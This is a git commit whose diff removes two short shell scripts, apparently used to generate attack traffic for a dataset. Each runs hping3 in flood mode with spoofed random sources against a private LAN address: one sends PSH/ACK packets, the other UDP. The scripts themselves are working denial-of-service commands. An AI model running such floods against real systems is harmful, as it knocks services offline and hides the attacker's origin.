baef2602365d888d3ef5a280bf5d47f04890ad83
Kenan <kenanabid10@gmail.com>
2020-04-18 19:33:20 +0100

    something

--- data_generation/attacks/pshackflood.sh
+++
@@ -1,5 +0,0 @@
-# Script to do a PSH and ACK Flood attack on the target machine
-
-# Execute the PSH and ACK Flood attack
-timeout 10m hping3 --flood --rand-source -PA -p 80 192.168.0.15
-
--- data_generation/attacks/udpflood.sh
+++
@@ -1,5 +0,0 @@
-# Script to do a udp flood attack on the target machine
-
-# Execute the UDP flood attack
-timeout 10m hping3 --flood --rand-source --udp -p 80 192.168.0.15
-
